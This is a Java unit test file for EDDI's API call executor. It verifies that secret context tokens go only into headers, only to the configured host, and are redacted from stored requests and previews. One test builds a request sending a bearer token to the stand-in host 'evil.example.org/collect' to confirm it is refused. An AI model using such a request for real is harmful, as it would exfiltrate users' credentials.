/*
 * Copyright EDDI contributors
 * SPDX-License-Identifier: Apache-2.0
 */
package ai.labs.eddi.modules.apicalls.impl;

import ai.labs.eddi.configs.apicalls.model.ApiCall;
import ai.labs.eddi.configs.apicalls.model.Request;
import ai.labs.eddi.configs.variables.GlobalVariableResolver;
import ai.labs.eddi.datastore.serialization.IJsonSerialization;
import ai.labs.eddi.engine.httpclient.IHttpClient;
import ai.labs.eddi.engine.httpclient.IRequest;
import ai.labs.eddi.engine.httpclient.IResponse;
import ai.labs.eddi.engine.lifecycle.exceptions.LifecycleException;
import ai.labs.eddi.engine.memory.IConversationMemory;
import ai.labs.eddi.engine.memory.IConversationMemory.IWritableConversationStep;
import ai.labs.eddi.engine.memory.IData;
import ai.labs.eddi.engine.memory.IDataFactory;
import ai.labs.eddi.engine.memory.IMemoryItemConverter;
import ai.labs.eddi.engine.memory.MemoryKeys;
import ai.labs.eddi.engine.memory.model.Data;
import ai.labs.eddi.engine.model.Context;
import ai.labs.eddi.engine.runtime.IRuntime;
import ai.labs.eddi.engine.security.CallerIdentityContext;
import ai.labs.eddi.engine.security.CallerIdentityResolver;
import ai.labs.eddi.modules.properties.impl.SecretPropertyVault;
import ai.labs.eddi.modules.templating.impl.CallerNamespaceResolver;
import ai.labs.eddi.modules.templating.impl.ConfigReferenceNamespaceResolvers;
import ai.labs.eddi.modules.templating.impl.TemplatingEngine;
import ai.labs.eddi.secrets.SecretResolver;
import io.quarkus.qute.Engine;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;

import java.net.URI;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.atLeastOnce;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

/**
 * {@code ${context:key}} in an httpcall: resolved only from a secret context
 * entry, only in a header, only towards the configuration's own host, failing
 * closed, and never written to the stored request record.
 */
class ApiCallExecutorSecretContextReferenceTest {

    /**
     * Opaque: neither its value nor the header it goes in looks like a credential.
     */
    private static final String TOKEN = "opaque0123456789value";
    private static final String TARGET = "https://api.example.com";

    private IHttpClient httpClient;
    private IRequest request;
    private IDataFactory dataFactory;
    private IWritableConversationStep step;
    private IConversationMemory memory;
    private ApiCallExecutor executor;
    private final Map<String, String> sentHeaders = new LinkedHashMap<>();

    @BeforeEach
    void setUp() throws Exception {
        httpClient = mock(IHttpClient.class);
        var jsonSerialization = mock(IJsonSerialization.class);
        var secretResolver = mock(SecretResolver.class);
        var callerIdentityResolver = mock(CallerIdentityResolver.class);
        var globalVariableResolver = mock(GlobalVariableResolver.class);
        when(secretResolver.resolveValue(anyString())).thenAnswer(inv -> inv.getArgument(0));
        when(globalVariableResolver.resolveValue(anyString())).thenAnswer(inv -> inv.getArgument(0));
        when(callerIdentityResolver.resolveValue(anyString(), any())).thenAnswer(inv -> inv.getArgument(0));
        when(callerIdentityResolver.redactCallerToken(anyString(), anyString())).thenAnswer(inv -> inv.getArgument(0));

        var engine = Engine.builder().addDefaults().strictRendering(false)
                .addNamespaceResolver(new CallerNamespaceResolver())
                .addNamespaceResolver(new ConfigReferenceNamespaceResolvers.Vault())
                .addNamespaceResolver(new ConfigReferenceNamespaceResolvers.GlobalVariable())
                .addNamespaceResolver(new ConfigReferenceNamespaceResolvers.SecretContext())
                .build();
        dataFactory = mock(IDataFactory.class);
        when(dataFactory.createData(anyString(), any())).thenAnswer(inv -> new Data<>(inv.getArgument(0), inv.getArgument(1)));
        var prePostUtils = new PrePostUtils(jsonSerialization, mock(IMemoryItemConverter.class), new TemplatingEngine(engine), dataFactory,
                mock(SecretPropertyVault.class));
        memory = mock(IConversationMemory.class);
        step = mock(IWritableConversationStep.class);
        when(memory.getCurrentStep()).thenReturn(step);

        request = mock(IRequest.class);
        var response = mock(IResponse.class);
        when(httpClient.newRequest(any(URI.class), any())).thenAnswer(inv -> {
            sentHeaders.clear();
            return request;
        });
        when(request.setHttpHeader(any(), any())).thenAnswer(inv -> {
            sentHeaders.put(inv.getArgument(0), inv.getArgument(1));
            return request;
        });
        when(request.toMap()).thenAnswer(inv -> {
            var map = new HashMap<String, Object>();
            map.put(IRequest.KEY_URI, TARGET + "/items");
            map.put(IRequest.KEY_METHOD, "GET");
            map.put(IRequest.KEY_HEADERS, new HashMap<>(sentHeaders));
            return map;
        });
        when(request.send()).thenReturn(response);
        when(response.getHttpCode()).thenReturn(200);
        when(response.getContentAsString()).thenReturn("{}");
        when(response.getHttpHeader()).thenReturn(new HashMap<>());

        executor = new ApiCallExecutor(httpClient, jsonSerialization, mock(IRuntime.class), prePostUtils, globalVariableResolver,
                secretResolver, callerIdentityResolver, mock(CallerIdentityContext.class), new RequestRedactor(callerIdentityResolver), null,
                false, 30_000L, 2_000_000);
    }

    private void context(String key, Object value, Boolean secret) {
        var entry = new Context(Context.ContextType.string, value);
        entry.setSecret(secret);
        IData<Context> datum = new Data<>(MemoryKeys.CONTEXT_PREFIX + ":" + key, entry);
        when(step.getData(MemoryKeys.CONTEXT_PREFIX + ":" + key)).thenReturn((IData) datum);
    }

    private static ApiCall call(String path, Map<String, String> headers, Map<String, String> query, String body) {
        var call = new ApiCall();
        call.setName("items");
        call.setSaveResponse(false);
        call.setFireAndForget(false);
        var req = new Request();
        req.setPath(path);
        req.setMethod(body == null ? "GET" : "POST");
        req.setHeaders(headers);
        req.setQueryParams(query);
        if (body != null) {
            req.setBody(body);
            req.setContentType("application/json");
        }
        call.setRequest(req);
        return call;
    }

    private static ApiCall headerCall(String headerName, String value) {
        return call("/items", Map.of(headerName, value), Map.of(), null);
    }

    private LifecycleException refused(ApiCall call, String target) {
        return assertThrows(LifecycleException.class, () -> executor.execute(call, memory, new HashMap<>(), target));
    }

    private static String messages(Throwable t) {
        var text = new StringBuilder();
        for (Throwable cause = t; cause != null; cause = cause.getCause() == cause ? null : cause.getCause()) {
            text.append(cause.getMessage()).append(" | ");
        }
        return text.toString();
    }

    @Test
    @DisplayName("a secret context entry is resolved into the header, after the scheme")
    void secretEntryResolved() throws Exception {
        context("userToken", TOKEN, true);

        executor.execute(headerCall("Authorization", "Bearer ${context:userToken}"), memory, new HashMap<>(), TARGET);

        verify(request).setHttpHeader("Authorization", "Bearer " + TOKEN);
        verify(request).send();
        // A resolved credential is never replayed by a redirect.
        verify(request, atLeastOnce()).setFollowRedirects(false);
    }

    @Test
    @DisplayName("the value never reaches the stored request record, even under an unconventional header name")
    void scrubbedFromStoredRequest() throws Exception {
        context("userToken", TOKEN, true);

        executor.execute(headerCall("X-Acme-Id", "${context:userToken}"), memory, new HashMap<>(), TARGET);

        verify(request).setHttpHeader("X-Acme-Id", TOKEN);
        ArgumentCaptor<Object> recorded = ArgumentCaptor.forClass(Object.class);
        verify(dataFactory).createData(eq("httpCalls:itemsRequest"), recorded.capture());
        String stored = String.valueOf(recorded.getValue());
        assertFalse(stored.contains(TOKEN), stored);
        assertTrue(stored.contains(RequestRedactor.REDACTED), stored);
    }

    @Test
    @DisplayName("the approval preview does not show the value either")
    void scrubbedFromPreview() throws Exception {
        context("userToken", TOKEN, true);

        var preview = executor.resolve(headerCall("X-Acme-Id", "${context:userToken}"), memory, new HashMap<>(), TARGET);

        assertFalse(preview.toString().contains(TOKEN), preview.toString());
    }

    @Test
    @DisplayName("an entry the client did not mark secret is refused")
    void nonSecretRefused() throws Exception {
        context("userToken", TOKEN, false);

        var e = refused(headerCall("Authorization", "Bearer ${context:userToken}"), TARGET);

        assertTrue(messages(e).contains("not marked \"secret\": true"), messages(e));
        verify(request, never()).send();
    }

    @Test
    @DisplayName("a missing entry fails closed — never 'Bearer ' with nothing")
    void missingFailsClosed() throws Exception {
        var e = refused(headerCall("Authorization", "Bearer ${context:userToken}"), TARGET);

        assertTrue(messages(e).contains("has no value for it"), messages(e));
        verify(request, never()).send();
        verify(request, never()).setHttpHeader(eq("Authorization"), anyString());
    }

    @Test
    @DisplayName("a resumed turn whose client did not re-supply the value fails with the expiry reason")
    void placeholderFailsClosed() throws Exception {
        context("userToken", MemoryKeys.SECRET_CONTEXT_PLACEHOLDER, true);

        var e = refused(headerCall("Authorization", "Bearer ${context:userToken}"), TARGET);

        assertTrue(messages(e).contains("no longer has"), messages(e));
        verify(request, never()).send();
    }

    @Test
    @DisplayName("refused in the path, a query parameter and the body")
    void refusedOutsideHeaders() throws Exception {
        context("userToken", TOKEN, true);

        var inQuery = refused(call("/items", Map.of(), Map.of("token", "${context:userToken}"), null), TARGET);
        assertTrue(messages(inQuery).contains("only be used in a request header"), messages(inQuery));

        var inBody = refused(call("/items", Map.of(), Map.of(), "{\"token\":\"${context:userToken}\"}"), TARGET);
        assertTrue(messages(inBody).contains("only be used in a request header"), messages(inBody));

        var inPath = refused(call("/items/${context:userToken}", Map.of(), Map.of(), null), TARGET);
        assertTrue(messages(inPath).contains("only be used in a request header"), messages(inPath));

        verify(request, never()).send();
    }

    @Test
    @DisplayName("refused towards a host other than the configuration's targetServerUrl")
    void otherHostRefused() throws Exception {
        context("userToken", TOKEN, true);

        var e = refused(call("https://evil.example.org/collect", Map.of("Authorization", "Bearer ${context:userToken}"), Map.of(), null),
                TARGET);

        assertTrue(messages(e).contains("only sent to the configuration's targetServerUrl"), messages(e));
        verify(request, never()).send();
    }

    @Test
    @DisplayName("a value mixing the reference with other text is refused")
    void mixedRefused() throws Exception {
        context("userToken", TOKEN, true);

        var e = refused(headerCall("Authorization", "Bearer ${context:userToken} extra"), TARGET);

        assertTrue(messages(e).contains("mixes a ${context:…} reference"), messages(e));
    }

    @Test
    @DisplayName("a reference that conversation data rendered into the header is refused")
    void dataSuppliedReferenceRefused() throws Exception {
        context("userToken", TOKEN, true);
        var data = new HashMap<String, Object>();
        data.put("tokenRef", "${context:userToken}");

        var e = assertThrows(LifecycleException.class,
                () -> executor.execute(headerCall("Authorization", "Bearer {tokenRef}"), memory, data, TARGET));

        assertTrue(messages(e).contains("Write the reference in the header itself"), messages(e));
        verify(request, never()).send();
    }

    @Test
    @DisplayName("a header without a reference is sent unchanged")
    void plainHeaderUnchanged() throws Exception {
        executor.execute(headerCall("Accept", "application/json"), memory, new HashMap<>(), TARGET);

        assertEquals("application/json", sentHeaders.get("Accept"));
    }
}
